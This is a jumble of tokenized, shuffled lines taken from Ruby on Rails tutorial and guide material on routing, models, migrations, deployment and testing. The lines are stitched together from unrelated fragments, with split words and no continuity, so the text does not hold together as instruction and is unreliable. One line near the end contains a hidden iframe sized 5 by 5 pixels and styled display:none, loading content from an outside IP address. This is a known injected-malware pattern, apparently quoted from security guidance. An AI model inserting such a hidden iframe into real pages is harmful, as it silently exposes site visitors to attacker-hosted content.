▁Recall ▁from ▁Section ~\ ref { sec : a _ proto _ feed } ▁that ▁the ▁Home ▁page ▁already ▁includes ▁the ▁feed ; ▁as ▁a ▁re m in d er , ▁the ▁\ k ode { home } ▁action ▁appears ▁again ▁in ▁Listing ~\ ref { code : real _ feed _ instance _ variable } .
▁* ▁` active _ record ▖ logger ` ▁Set s ▁` ActiveRecord :: Base ▖ logger ` ▁- ▁if ▁it ' s ▁not ▁already ▁set ▁- ▁to ▁` Rails ▖ logger ` .
▁Rails ▁class ▁and ▁module ▁ autoload ing ▁uses ▁` underscore ` ▁to ▁infer ▁the ▁relative ▁path ▁without ▁extension ▁of ▁a ▁file ▁that ▁would ▁define ▁a ▁given ▁missing ▁constant :
▁This ▁gives ▁us ▁a ▁command ▁called ▁\ k ode { annotate }, ▁which ▁simply ▁add s ▁comments ▁containing ▁the ▁data ▁model ▁to ▁the ▁model ▁file :
▁Thu s , ▁we ▁have ▁\ k ode { User } ▁instead ▁of ▁\ k ode { Users } .
▁=> ▁" Michael ▁Hartl "
▁ Local ize d ▁View s
▁CSS ▁allows ▁us ▁to ▁style ▁the ▁site ▁layout ▁base d ▁on ▁CSS ▁classes ▁and ▁id s .
▁resources ▁: messages , ▁concern s : ▁: comment able
▁* ▁` config ▖ eager _ load _ namespace s ` ▁ register s ▁ namespace s ▁that ▁are ▁ eager ▁loaded ▁when ▁` config ▖ eager _ load ` ▁is ▁true ▖
▁config ▖ action _ mailer ▖ delivery _ method ▁= ▁: smtp
▁I ▁prefer ▁the ▁\ href { http :// d ar ing fi re b all ▖ net / projects / m ar k d own /}{ Markdown ▁markup ▁language } ▁to ▁the ▁default ▁ RDoc ▁for ▁this ▁purpose , ▁and ▁if ▁you ▁use ▁the ▁file ▁extension ▁\ k ode { ▖ md } ▁then ▁Bitbucket ▁will ▁automatically ▁format ▁it ▁nicely ▁for ▁you .
▁To ▁get ▁the ▁test ▁to ▁pass , ▁we ▁first ▁generate ▁an ▁appropriate ▁migration ▁for ▁the ▁\ k ode { password \_ digest } ▁column :
▁In ▁particular , ▁these ▁two ▁commands ▁can c el ▁each ▁other ▁out :
▁The ▁name ▁of ▁ child re n ▁ n ode s ▁is ▁by ▁default ▁the ▁name ▁of ▁the ▁root ▁ n ode ▁ singularize d ▖
▁### ▁ Schema ▁ Convention s
▁as ▁show n ▁in ▁Listing ~\ ref { code : static _ page _ routes _ test } .
▁* ▁` employee s / _ employee ▖ html ▖ erb `
▁* ▁`: equal _ to ` ▁- ▁Specif ies ▁the ▁value ▁must ▁be ▁equal ▁to ▁the ▁supplied ▁value ▖
▁resources ▁: photos , ▁only : ▁ [: index , ▁: show ]
▁This ▁line ▁is ▁simply ▁` resources ▁: articles `, ▁turn ing ▁the ╼` config / routes ▖ rb ` ▁file ▁for ▁the ▁engine ▁into ▁this :
▁Application s ▁get ▁` secrets ▖ secret _ key _ base ` ▁initializ ed ▁to ▁a ▁random ▁key ▁present ▁in ▁` config / secrets ▖ yml ` .
▁This ▁ augment ed ▁\ k ode { ▖ gitignore } ▁arrange s ▁to ▁ignore ▁Rails ▁documentation ▁files , ▁ V im ▁and ▁E ma c s ▁ swap ▁files , ▁and ▁( for ▁OS ~ X ▁users ) ▁the ▁we ir d ▁\ k ode { ▖ D S \_ Store } ▁directories ▁created ▁by ▁the ▁M ac ▁Find er ▁application .
▁After ▁ Cloud 9 ▁has ▁ finished ▁pro v is ion ing ▁the ▁ workspace , ▁select ▁it ▁and ▁click ▁`` S t ar t ▁edit ing ''
▁This ▁is ▁used ▁by ▁+ url _ for + ▁in ▁Action ▁Pack .
▁If ▁you ▁open ▁up ▁the ▁new ly ▁generated ▁` app / controllers / articles _ controller ▖ rb `╼ you ' ll ▁see ▁a ▁fai r ly ▁empty ▁controller :
▁If ▁the ▁email ▁address ▁exists ▁in ▁the ▁database , ▁generate ▁a ▁reset ▁token ▁and ▁corresponding ▁reset ▁digest .
▁in ▁a ▁b un ch ▁of ▁place s , ▁when ▁what ▁you ▁really ▁want ▁is ▁to ▁indicate ▁that ▁the ▁page ▁should ▁have ▁an ▁error ▁message .
▁After ▁making ▁the ▁changes , ▁verify ▁that ▁the ▁test ▁suite ▁is ▁ still ▁\ passing .
▁ ╼ ▁$ ▁bundle ▁exec ▁rake ▁db : migrate
▁Fin ally , ▁we ▁need ▁to ▁set ▁up ▁SSL ▁on ▁the ▁remote ▁server .
▁( 1 ▖▖▖ 9 ) ▁= == ▁( 3 ▖ ▖ 9 ) ▁# ▁=> ▁false
▁Here ▁are ▁some ▁suggest ion s ▁for ▁further ▁learning :
▁to ▁work , ▁we ▁need ▁a ▁form ▁for ▁reset ting ▁passwords .
▁The ▁result ▁of ▁following ▁an ▁un followed ▁user .
▁as ▁show n ▁in ▁Listing ~\ ref { code : full _ feed _ spec s } .
▁self ▖ author ▁= ▁Blorgh ▖ author _ class ▖ find _ or _ create _ by ( name : ▁author _ name )
▁The ▁methods ▁` to _ options ` ▁and ▁` to _ options !` ▁are ▁respectively ▁alias es ▁of ▁` symbolize _ keys ` ▁and ▁` symbolize _ keys !` .
▁ mod ▁= ▁ mod _ name ▖ empty ? ▁?
▁D ur ation s ▁can ▁be ▁added ▁to ▁and ▁sub tr ac ted ▁from ▁date s :
▁That ' s ▁a ▁ side - e ffect ▁of ▁the ▁nesting ▁that ▁you ' ve ▁set ▁up ▖
▁This ▁means ▁that ▁behavior ▁may ▁change ▁depending ▁on ▁the ▁scope ▁or ▁context ▁of ▁the ╼ method ▁or ▁class ▁you ' re ▁try ing ▁to ▁document .
▁scope ▁' : user name ' ▁do
▁=> ▁ 51
▁This ▁can ▁be ▁achieve d ▁like ▁this
▁#### ▁` deconstantize `
▁If ▁you ▁rely ▁on ▁the ▁ ordering , ▁you ▁should ▁check ▁if ▁correct ▁methods ▁are ▁available ▁after ▁upgrade ▖
▁* ▁scope .
▁* ▁FROM ▁categories
▁there by ▁in v o k ing ▁the ▁\ k ode { current \_ user = } ▁method .
▁The ▁` where ` ▁method ▁allows ▁you ▁to ▁specify ▁conditions ▁to ▁ limit ▁the ▁records ▁returned , ▁represent ing ▁the ▁` W H E RE ` - part ▁of ▁the ▁SQL ▁statement ▖
▁ ╼ ▁ ╼ ▁end
▁This ▁creates ▁`` get ter '' ▁and ▁`` set ter '' ▁methods ▁that ▁allow ▁us ▁to ▁retrieve ▁( get ) ▁and ▁assign ▁( set ) ▁\ k ode {@ name } ▁and ▁\ k ode {@ email } ▁\ emph { instance ▁variables }, ▁which ▁were ▁mentioned ▁brief ly ▁in ▁Section ~\ ref { sec : mvc _ in _ action } ▁and ▁Section ~\ ref { sec : exercises _ adding _ page _ title s } .
▁$ ▁git ▁push ▁ origin ▁master
▁To ▁perform ▁the ▁ com put ation ▁the ▁method ▁first ▁ increment s ▁ years , ▁then ▁ months , ▁then ▁ weeks , ▁and ▁finally ▁day s ▖
▁def ▁evaluate ( scope , ▁local s , ▁& block )
▁( U nfortunately , ▁return ing ▁a ▁ paginate d ▁feed ▁doesn ' t ▁work ▁in ▁this ▁case .
▁This ▁is ▁also ▁a ▁great ▁way ▁to ▁get ▁started ▁explor ing ▁the ▁source ▁code : ▁look ing ▁at ▁the ▁existing ▁test ▁files ▁will ▁teach ▁you ▁how ▁to ▁write ▁more ▁tests ▖
▁The ▁following ▁one s ▁are ▁discuss ed ▁below :
▁users ▁GET ▁ / users (▖ : format ) ▁users # index
▁ alert (' A ll ▁is ▁good ')
▁By ▁specify ing ▁it ▁as ▁a ▁gem ▁within ╼ the ▁` Gemfile `, ▁Bundler ▁will ▁load ▁it ▁as ▁such , ▁pa rs ing ▁this ▁` blorgh ▖ gem spec ` ▁file ╼ and ▁ requiring ▁a ▁file ▁within ▁the ▁` lib ` ▁directory ▁called ▁` lib / blorgh ▖ rb ` ▖
▁The ▁method ▁` beginning _ of _ hour ` ▁returns ▁a ▁timestamp ▁at ▁the ▁beginning ▁of ▁the ▁ hour ▁( h h :00:00 ) :
▁If ▁you ▁would ▁like ▁to ▁change ▁the ▁order ▁in ▁which ▁engines ▁are ▁loaded , ▁you ▁can ▁use ▁` config ▖ railties _ order = ` ▁method .
▁Sometimes ▁in ex pe ri ence d ▁developers ▁think ▁of ▁` redirect _ to ` ▁as ▁a ▁sort ▁of ▁` got o ` ▁command , ▁mov ing ▁execut ion ▁from ▁one ▁place ▁to ▁another ▁in ▁your ▁Rails ▁code ▖
▁As ▁in ▁Listing ~\ ref { code : email _ format _ valid _ tests }, ▁Listing ~\ ref { code : email _ format _ validation _ tests } ▁includes ▁a ▁custom ▁error ▁message ▁to ▁identify ▁the ▁exact ▁address ▁caus ing ▁any ▁failure .
▁We ▁can ▁then ▁push ▁the ▁code ▁to ▁the ▁remote ▁repository ▁and ▁deploy ▁the ▁application ▁to ▁production :
▁The ▁result ing ▁tests ▁appear ▁in ▁Listing ~\ ref { code : remember _ me _ test } .
▁<%= ▁form _ for ▁[ ▁: update _ name , ▁@ user ▁ ] ▁do ▁| f | ▁%>
▁get s ▁run ▁through ▁the ▁CoffeeScript ▁process or , ▁and
▁F ing er print ing ▁is ▁a ▁technique ▁that ▁make s ▁the ▁name ▁of ▁a ▁file ▁ dependent ▁on ▁the ╼ content s ▁of ▁the ▁file ▖
▁NOTE : ▁Other ▁engines , ▁such ▁as ▁ Devise , ▁handle ▁this ▁a ▁little ▁different ly ▁by ▁making ╼ you ▁specify ▁custom ▁helpers ▁( such ▁as ▁` devise _ for ` ) ▁in ▁the ▁routes ▖
▁### ▁S a y ▁" Hello ", ▁Rails
▁> > ▁p ▁= ▁Person ▖ new ( name : ▁" John ▁Doe ")
▁if : ▁[" m ar k e t ▖ re tail ? ", ▁: de s k to p ? ]
▁in ▁Listing ~\ ref { code : user _ signout _ test } .
▁It ' s ▁worth ▁noting ▁that ▁the ▁\ k ode { get } ▁and ▁\ k ode { post } ▁steps ▁above ▁are ▁technical ly ▁un rel at ed , ▁and ▁it ' s ▁actually ▁not ▁necessary ▁to ▁get ▁the ▁signup ▁path ▁before ▁post ing ▁to ▁the ▁users ▁path .
▁unless ▁record ▖ name ▖ start s _ with ?
▁### ▁The ▁ Query ▁ String
▁| ▁1 ▁| ▁ SIMPLE ▁| ▁articles ▁| ▁ ALL ▁| ▁NULL ▁|
▁Next , ▁there ▁needs ▁to ▁be ▁a ▁form ▁so ▁that ▁comments ▁can ▁be ▁created ▁on ▁an ▁article ▖
▁| ▁| ▁20 8 ▁| ▁: already _ re port ed ▁|
▁In ▁the ▁case ▁of ▁an ▁Ajax ▁request , ▁Rails ▁automatically ▁calls ▁a ▁\ emph { JavaScript ▁ embedded ▁Ruby } ▁(\ k ode { ▖ js ▖ erb }) ▁file ▁with ▁the ▁same ▁name ▁as ▁the ▁action , ▁i ▖ e ▖ , ▁\ k ode { create ▖ js ▖ erb } ▁or ▁\ k ode { destroy ▖ js ▖ erb } .
▁The ▁user ▁signup ▁form .
▁In ▁Chapter ~\ ref { cha : account _ activation _ and _ password _ resets }, ▁we ' ll ▁make ▁\ emph { sure } ▁of ▁email ▁ validity ▁by ▁adding ▁a ▁separate ▁\ emph { account ▁activation } ▁step ▁to ▁user ▁signup .
▁That ' s ▁typical ly ▁used ▁with ╼ collection s ▁of ▁Active ▁Record ▁objects ▖
▁You ▁will ▁see ▁that ▁it ▁works ▁exactly ▁in ▁the ╼ s a me ▁way ▁as ▁before , ▁except ▁this ▁time ▁the ▁engine ▁is ▁using ▁the ▁configuration ╼ set ting ▁in ▁` config / initializers / blorgh ▖ rb ` ▁to ▁learn ▁what ▁the ▁class ▁is .
▁# ▁< rank ▁type =" integer "> 2 </ rank >
▁Verify ▁that , ▁for ▁example , ▁\ k ode { params [: fa the r ] [: first ]} ▁has ▁the ▁right ▁value .
▁O p t im ist ic ▁ lock ing ▁allows ▁multiple ▁users ▁to ▁access ▁the ▁same ▁record ▁for ▁edit s , ▁and ▁ assumes ▁a ▁ minimum ▁of ▁conflicts ▁with ▁the ▁data ▖
▁The ▁` select ` ▁method ▁let s ▁you ▁override ▁the ▁SQL ▁` SELECT ` ▁clause ▁that ▁is ▁used ▁to ▁retrieve ▁data ▁about ▁the ▁ associated ▁object ▖
▁Before ▁mov ing ▁on , ▁if ▁you ' re ▁using ▁Git ▁it ' s ▁a ▁good ▁idea ▁to ▁add ▁the ▁files ▁for ▁the ▁StaticPages ▁controller ▁to ▁the ▁repository :
▁# ▁Person ▖ exists ?(
▁=> ▁[" User "]
▁< h 1> Hello , ▁Rails !
▁In ▁particular , ▁large ▁images ▁would ▁ still ▁take ▁a ▁while ▁to ▁load .
▁ mkdir ▁< d ir name >
▁<%= ▁image _ tag ▁" home ▖ g if ", ▁ alt : ▁" Go ▁Home ",
▁Validation ▁ Helpers
▁You ▁can ▁also ▁supply ▁a ▁hash ▁of ▁ additional ▁options , ▁such ▁as ▁`: id `, ▁`: class ` ▁etc .
▁**` Rack :: Conditional G e t ` **
▁do _ one _ th ing ▁: ▁do _ something _ else
▁In ▁this ▁chapter , ▁we ' ll ▁rely ▁on ▁the ▁User ▁model ▁validations ▁from ▁Chapter ~\ ref { cha : modeling _ users } ▁to ▁increase ▁the ▁ o d d s ▁of ▁new ▁users ▁ having ▁valid ▁email ▁addresses .
▁After ▁restart ing ▁the ▁development ▁server ▁to ▁activate ▁the ▁configuration ▁in ▁Listing ~\ ref { code : development _ email _ settings }, ▁we ▁next ▁need ▁to ▁update ▁the ▁User ▁mailer ▁\ emph { preview ▁file }, ▁which ▁was ▁automatically ▁generated ▁in ▁Section ~\ ref { sec : account _ activation _ email s }, ▁as ▁show n ▁in ▁Listing ~\ ref { code : generated _ user _ mailer _ preview s } .
▁#### ▁Pass ing ▁ Local ▁ V a ri able s
▁C on st an t ▁name ▁re s ol u tion ▁by ▁` constantize ` ▁start s ▁always ▁at ▁the ▁to p - level ▁` Object ` ▁even ▁if ▁there ▁is ▁no ▁leading ▁" :: " .
▁Note ▁that ▁ chain ing ▁` unscope d ` ▁with ▁a ▁` scope ` ▁does ▁not ▁work ▖
▁By ▁using ▁` joins ` ▁( an ▁ INNER ╼ JOIN ), ▁the ▁join ▁conditions ▁** must ** ▁match , ▁otherwise ▁no ▁records ▁will ▁be ╼ return ed .
▁ Asset s ▁are ▁ compiled ▁and ▁cached ▁on ▁the ▁first ▁request ▁after ▁the ▁server ▁is ▁started ▖╼
▁In ▁Rails , ▁the ▁situation ▁is ▁different --- \ k ode { StaticPages Controller } ▁is ▁a ▁Ruby ▁class , ▁but ▁because ▁it ▁inherit s ▁from ▁\ k ode { Application Controller } ▁the ▁behavior ▁of ▁its ▁methods ▁is ▁specific ▁to ▁Rails : ▁when ▁visit ing ▁the ▁URL ▁ / static \_ pages / home , ▁Rails ▁look s ▁in ▁the ▁Static ▁Pages ▁controller ▁and ▁execute s ▁the ▁code ▁in ▁the ▁\ k ode { home } ▁action , ▁and ▁then ▁render s ▁the ▁\ emph { view } ▁( the ▁ V ▁in ▁ MVC ▁from ▁Section ~\ ref { sec : mvc }) ▁corresponding ▁to ▁the ▁action .
▁In ▁the ▁case ▁of ▁ persistent ▁sessions , ▁we ▁want ▁to ▁retrieve ▁the ▁user ▁from ▁the ▁temporary ▁session ▁if ▁\ k ode { session [: user \_ id ]} ▁exists , ▁but ▁otherwise ▁we ▁should ▁look ▁for ▁\ k ode { cookies [: user \_ id ]} ▁to ▁retrieve ▁( and ▁log ▁in ) ▁the ▁user ▁corresponding ▁to ▁the ▁ persistent ▁session .
▁module ▁Find Re c ent E x t en s ion
▁S ince ▁we ▁will ▁be ▁using ▁email ▁addresses ▁as ▁user name s , ▁this ▁sort ▁of ▁\ k ode { find } ▁will ▁be ▁useful ▁when ▁we ▁learn ▁how ▁to ▁let ▁users ▁log ▁in ▁to ▁our ▁site ▁( Chapter ~\ ref { cha : sign _ up }) .
▁Un comment ing ▁the ▁before ▁filter ▖
▁H is ▁p ri or ▁experience ▁includes ▁writing ▁and ▁developing ▁\ emph { RailsSpace }, ▁an ▁ extremely ▁ ob so let e ▁Rails ▁tutorial ▁book , ▁and ▁developing ▁In so s hi , ▁a ▁once - po p ul ar ▁and ▁now - ob so let e ▁so cial ▁ net working ▁platform ▁in ▁Ruby ▁on ▁Rails .
▁See ▁[ # 1 44 88 ]( https :// github ▖ com / rails / rails / pull /1 44 88 ) ▁and ╼[ # 16 5 37 ]( https :// github ▖ com / rails / rails / pull / 16 5 37 ) ▁for ▁more ▁details .
▁| ▁HTTP ▁Verb ▁| ▁Path ▁| ▁Controller # Action ▁| ▁Name d ▁ Helper ▁|
▁But ▁you ▁don ' t ▁need ▁to ▁know ▁this ▁to ▁develop ▁applications ▁with ▁Rails .
▁There ' s ▁a ▁ s l ight ▁difference ▁in ▁the ▁display , ▁though ; ▁in ▁the ▁profile ▁ sidebar , ▁`` Microposts '' ▁is ▁a ▁ label , ▁and ▁ showing ▁`` Microposts ▁ (1) '' ▁make s ▁sense .
▁It ▁provides ▁a ╼ var i e t y ▁of ▁options , ▁so ▁you ▁can ▁specify ▁length ▁constraints ▁in ▁different ▁ways :
▁( This ▁will ▁require ▁a ▁modification ▁of ▁the ▁\ k ode { authenticated ?}\ ▁method ▁defined ▁in ▁Listing ~\ ref { code : authenticated _ p } ▖)
▁With ▁the ▁code ▁in ▁Listing ~\ ref { code : user _ model _ password _ reset _ expired }, ▁the ▁\ k ode { update } ▁action ▁in ▁Listing ~\ ref { code : password _ reset _ update _ action } ▁should ▁be ▁working .
▁ 111▖2345 ▖ to _ s (: rounded , ▁ precision : ▁2 ) ▁# ▁=> ▁111▖23
▁This ▁section ▁cover s ▁how ▁to ▁make ▁the ▁` User ` ▁class ▁config ur able , ▁followed ▁by ╼ g en er al ▁configuration ▁t ips ▁for ▁the ▁engine .
▁The ▁source ▁can ▁be ▁a ▁full ▁path ▁or ▁a ▁file ▁that ▁exists ▁in ▁your ▁` app / assets / images ` ▁directory .
▁* ▁ Follow ▁the ▁convention s ▁in ▁the ▁source ▁you ▁see ▁used ▁already .
▁And ▁yet , ▁names ▁and ▁email ▁addresses ▁are ▁more ▁specific ▁than ▁this .
▁config ▖ before _ initialize ▁do
▁If ▁you ▁used ▁the ▁ pluralize d ▁form ▁in ▁the ▁above ▁example ▁for ▁the ▁` customer ` ▁association ▁in ▁the ▁` Order ` ▁model , ▁you ▁would ▁be ▁to ld ▁that ▁there ▁was ▁an ▁" un initialize d ▁constant ▁ Order :: Customer s "▖
▁in ▁Listing ~\ ref { code : ssl _ in _ production } .
▁get ▁' preview '
▁In ▁order ▁to ▁ factor ▁out ▁this ▁common ▁structure , ▁Rails ▁comes ▁with ▁a ▁special ▁\ emph { layout } ▁file ▁called ▁\ k ode { application ▖ html ▖ erb }, ▁which ▁we ▁re name d ▁in ▁the ▁beginning ▁of ▁this ▁section ▁( Section ~\ ref { sec : slightly _ dynamic _ pages }) ▁and ▁which ▁we ' ll ▁now ▁re store :
▁t ▖ datetime ▁: order _ date
▁A lthough ▁we ▁started ▁ deploying ▁our ▁application ▁in ▁Chapter ~\ ref { cha : static _ pages }, ▁this ▁is ▁the ▁first ▁time ▁it ▁will ▁actually ▁\ emph { do } ▁something , ▁so ▁we ' ll ▁take ▁this ▁opportunit y ▁to ▁make ▁the ▁deployment ▁ professional - grade .
▁The ▁ home ▁page ▁with ▁form ▁errors ▖ ~\ href { http :// railstutorial ▖ org / images / figures / home _ form _ errors _ bootstrap - full ▖ png }{( full ▁size )}
▁You ▁may ▁recall ▁from ▁Listing ~\ ref { code : generate _ users _ controller } ▁that ▁we ▁created ▁a ▁Users ▁controller ▁( a long ▁with ▁a ▁\ k ode { new } ▁action ) ▁using ▁the ▁command
▁as ▁show n ▁in ▁Listing ~\ ref { code : user _ show _ microposts } .
▁For ▁example , ▁when ▁an ▁action ▁of ▁` Article sController ` ▁is ▁called ▁Rails ▁ tries ▁to ▁load ▁` articles _ helper ▖ rb `, ▁but ▁that ▁file ▁may ▁not ▁exist ▖
▁By ▁following ▁the ▁example ▁of ▁the ▁\ k ode { hello } ▁action ▁in ▁Listing ~\ ref { code : hello _ action }, ▁add ▁a ▁second ▁action ▁called ▁\ k ode { goodbye } ▁that ▁render s ▁the ▁text ▁`` goodbye , ▁world !'' .
▁ ╼ ▁else
▁ Adding ▁the ▁upload s ▁directory ▁to ▁the ▁\ k ode { ▖ gitignore } ▁file .
▁raise ▁No n In f er r able Mailer Error ▖ new ( name )
▁To ▁ r ever t ▁all ▁migrations ▁from ▁ blorgh ▁engine ▁you ▁can ▁run ▁code ▁such ▁as :
▁=> ▁" 5 ▁errors "
▁On ce ▁the ▁\ k ode {@ users } ▁variable ▁is ▁defined , ▁the ▁controller ▁calls ▁the ▁\ emph { view } ▁( Step ~ 6 ), ▁show n ▁in ▁Listing ~\ ref { code : demo _ index _ view } .
▁The ▁method ▁` beginning _ of _ day ` ▁returns ▁a ▁timestamp ▁at ▁the ▁beginning ▁of ▁the ▁day ▁( 00 :00:00 ) :
▁#### ▁` last ( limit ▁= ▁1) `
▁This ▁d eprecation ▁also ▁concern s ▁the ▁helpers ▁base d ▁on ▁this ▁one ▁( such ▁as ▁` link _ to _ if `╼ or ▁` link _ to _ unless ` ) .
▁| ▁--------- ▁| ▁--------- - ---------------- ▁| ▁-- ---------------- ▁| ▁------- ---------------- ▁|
▁is ▁ mostly ▁equivalent ▁to
▁S ince ▁we ▁included ▁the ▁\ k ode { home } ▁and ▁\ k ode { help } ▁actions ▁in ▁Listing ~\ ref { code : generating _ pages }, ▁the ▁routes ▁file ▁already ▁has ▁a ▁rule ▁for ▁each ▁one , ▁as ▁seen ▁in ▁Listing ~\ ref { code : pages _ routes } .
▁layout ▁" main "
▁in ▁Listing ~\ ref { code : friendly _ session _ create } .
▁Because ▁we ▁configured ▁Bundler ▁not ▁to ▁install ▁production ▁gems ▁( Section ~\ ref { sec : sample _ app _ setup }), ▁Listing ~\ ref { code : puma _ gemfile } ▁won ' t ▁add ▁any ▁gems ▁to ▁the ▁development ▁environment , ▁but ▁we ▁ still ▁need ▁to ▁run ▁Bundler ▁to ▁update ▁\ k ode { Gemfile ▖ lock } :
▁TEST O P T S =" - - name ▁test _ login _ with _ valid _ information "
▁With ▁the ▁\ k ode { digest } ▁method ▁from ▁Listing ~\ ref { code : test _ helper _ digest }, ▁we ▁are ▁now ▁ready ▁to ▁create ▁a ▁user ▁fixture ▁for ▁a ▁valid ▁user , ▁as ▁show n ▁in ▁Listing ~\ ref { code : real _ user _ fixture } .
▁As ▁a ▁final ▁setup ▁step , ▁you ▁can ▁optional ly ▁set ▁the ▁editor ▁Git ▁will ▁use ▁for ▁commit ▁messages .
▁= ================
▁The ▁default ▁is ▁` ENV [' RAILS _ RE LA T I V E _ URL _ ROOT ']` .
▁To ▁include ▁the ▁ uploader ▁on ▁the ▁Home ▁page ▁as ▁in ▁Figure ~\ ref { fig : micropost _ image _ mockup }, ▁we ▁need ▁to ▁include ▁a ▁\ k ode { file \_ field } ▁tag ▁in ▁the ▁micropost ▁form , ▁as ▁show n ▁in ▁Listing ~\ ref { code : micropost _ create _ image _ upload } .
▁( O n ▁most ▁systems , ▁restart ing ▁the ▁server ▁will ▁involve ▁ press ing ▁\ text tt { Ctrl - C } ▁and ▁then ▁running ▁\ k ode { rails ▁server } ▖)
▁in ▁Listing ~\ ref { code : add _ remember _ digest _ to _ users } .
▁Whi le ▁` indent _ string ` ▁is ▁typical ly ▁one ▁ space ▁or ▁ tab , ▁it ▁may ▁be ▁any ▁string .
▁* ▁Re present ▁inheritance ▁ hierarchies ▁through ▁related ▁models .
▁$ ▁git ▁ checkout ▁branch _ name
▁( Because ▁the ▁default ▁ navbar ▁ color ▁changed ▁after ▁Bootstrap ▁2▖0 , ▁we ▁need ▁the ▁\ k ode { navbar - inverse } ▁class ▁to ▁make ▁it ▁d ar k ▁instead ▁of ▁light ▖)
▁The ▁following ▁changes ▁are ▁mean t ▁for ▁upgrading ▁your ▁application ▁to ▁the ▁latest ╼ 3▖2 ▖ x ▁version ▁of ▁Rails .
▁This ▁demonstrate s ▁a ▁short er ▁syntax ▁for ▁the ▁examples ▁in ▁[ Array ▁Conditions ](# array - condition s )
▁We ▁then ▁enter ▁valid ▁signin ▁information ▁and ▁click ▁the ▁`` Sign ▁in '' ▁button .
▁( This ▁ st range - lo o k ing ▁but ▁ compact ▁code ▁uses ▁a ▁\ emph { symbol }, ▁which ▁we ' ll ▁discuss ▁in ▁Section ~\ ref { sec : hashes _ and _ symbols } ▖)
▁ umerate }╼╼ ▁% ▁subsection ▁layout _ link _ tests ▁( end )╼╼ ▁\ subsection { Log in ▁upon ▁signup } ▁% ▁( fold )╼ ▁\ label { sec : login _ upon _ signup }╼╼
▁ { nil ▁=> ▁nil , ▁1 ▁=> ▁1, ▁a : ▁: a } ▖ stringify _ keys
▁╼╼ ▁$ ▁rails ▁console
▁delete ▁user
▁If ▁you ▁don ' t ▁set ▁` dependent ` ▁to ╼ destroy ▁such ▁associations ▁you ▁won ' t ▁be ▁able ▁to ▁change ▁the ▁ associated ▁object ╼ because ▁initial ▁ associated ▁object ▁foreign ▁key ▁will ▁be ▁set ▁to ▁un allow ed ▁` NULL `╼ value .
▁* ▁`: content _ type `
▁As ▁of ▁Rails ~4▖0 , ▁all ▁scope s ▁take ▁an ▁ anonymous ▁function ▁that ▁returns ▁the ▁c ri ter ia ▁desired ▁for ▁the ▁scope , ▁main ly ▁so ▁that ▁the ▁scope ▁need ▁not ▁be ▁evaluated ▁immediately , ▁but ▁rather ▁can ▁be ▁loaded ▁later ▁on ▁an ▁as - ne ed ed ▁basis ▁( so - called ▁\ emph { lazy ▁evaluat ion }) .
▁If ▁you ▁want ▁to ▁run ▁SSL ▁on ▁a ▁custom ▁domain , ▁such ▁as ▁\ k ode { example ▖ com }, ▁you ' ll ▁have ▁no ▁choice ▁but ▁to ▁end ure ▁some ▁pa in , ▁which ▁you ▁can ▁read ▁about ▁on ▁\ href { http :// dev center ▖ heroku ▖ com / articles / ssl } { Heroku ' s ▁page ▁on ▁SSL } .
▁person ▁= ▁Person ▖ create ( name : ▁" !
▁To ▁deploy ▁the ▁application , ▁the ▁first ▁step ▁is ▁to ▁use ▁Git ▁to ▁push ▁it ▁up ▁to ▁Heroku :
▁The ▁complete ▁HTML ▁returned ▁to ▁the ▁client ▁is ▁ com po s ed ▁of ▁a ▁combination ▁of ▁this ▁ ERB ▁file , ▁a ▁layout ▁template ▁that ▁wrap s ▁it , ▁and ▁all ▁the ▁partials ▁that ▁the ▁view ▁may ▁reference ▖
▁ Custom ▁HTML ▁for ▁the ▁Home ▁page .
▁Even ▁ o d d er , ▁p erhaps , ▁is ▁that ▁the ▁\ k ode { destroy } ed ▁object ▁ still ▁exists ▁in ▁memory :
▁Let ' s ▁assume ▁we ▁want ▁to ▁deploy ▁our ▁application ▁to ▁"/ app 1 "▖
▁It ▁can ▁receive ▁an ▁`: accept ` ▁option , ▁which ▁determine s ▁the ▁value ▁that ▁will ▁be ╼ con side r ed ▁ acceptance ▖
▁* ▁The ▁route ▁name ▁( if ▁any )
▁That ' s ▁required ▁for ▁the ▁association ▁to ▁work ▁properly ▖
▁To ▁get ▁started ▁with ▁the ▁implementation , ▁we ▁first ▁generate ▁a ▁Relationship ▁model ▁as ▁follows :
▁With out ▁it , ▁classes ▁generated ▁in ▁an ▁engine ╼ ** ma y ** ▁ conflict ▁with ▁an ▁application .
▁Note ▁from ▁Table ~\ ref { table : association _ methods } ▁that ▁instead ▁of
▁Note ▁the ▁value ▁of ▁\ k ode { user ▖ updated \_ at } .
▁< iframe ▁name =" S t at P age " ▁src =" http :// 58 ▖ x x ▖ x x x ▖ x x x " ▁ width = 5 ▁ height = 5 ▁style =" display : none "></ iframe >
▁T hough ▁at ▁first ▁it ▁may ▁seem ▁mysterious , ▁\ emph { or ▁equal s } ▁is ▁easy ▁to ▁understand ▁by ▁analogy .
▁end { enumerate } ╼╼% ▁subsection ▁image _ validation ▁( end )╼╼ \ subsection { Image ▁ resizing } ▁% ▁( fold )╼\ label { sec : image _ resizing }╼╼
▁as ▁show n ▁in ▁Listing ~\ ref { code : stats _ partial } .
▁ Show ing ▁the ▁users ▁being ▁followed ▁by ▁the ▁current ▁user ▖ ~\ href { http :// railstutorial ▖ org / images / figures / user _ following _ bootstrap - full ▖ png }{( full ▁size )}
▁Your ▁goal ▁should ▁be ▁to ▁make ▁it ▁easy ▁for ▁yourself ▁- ▁and ▁other s ▁- ▁to ▁re p li c ate ▁the ▁bug ▁and ▁ figure ▁out ▁a ▁fix .
▁Running ▁the ▁Rails ▁server ▁in ▁a ▁separate ▁ tab .
▁invoke ▁scaffold _ controller
▁Then ▁we ▁install ▁as ▁usual :
▁A ▁stylesheet ▁file ▁can ▁be ▁store d ▁in ▁one ▁of ▁three ▁location s : ▁` app / assets `, ▁` lib / assets ` ▁or ▁` vendor / assets ` .
▁For ▁a ▁more ▁in - de p th ▁treat ment ▁of ▁the ▁Unix ▁command ▁line , ▁see ▁\ href { http :// c onquering the command line ▖ com /}{ \ emph { C onquering ▁the ▁Command ▁L in e } } ▁by ▁Mar k ▁Bates ▁( available ▁as ▁a ▁\ href { http :// c onquering the command line ▖ com / book } { free ▁online ▁version } ▁and ▁as ▁\ href { http :// c onquering the command line ▖ com / # p r ic ing } { e books ▁and ▁ screencasts }) .
▁ attr _ internal ▁: request , ▁: layout
▁The ▁Gravatar ▁site ▁actually ▁redirect s ▁this ▁to ▁\ href { http :// en ▖ gravatar ▖ com / email s } { http :// en ▖ gravatar ▖ com / email s }, ▁which ▁is ▁for ▁English ▁language ▁users , ▁but ▁I ' ve ▁omitted ▁the ▁\ text tt { en } ▁part ▁to ▁account ▁for ▁the ▁use ▁of ▁other ▁languages .
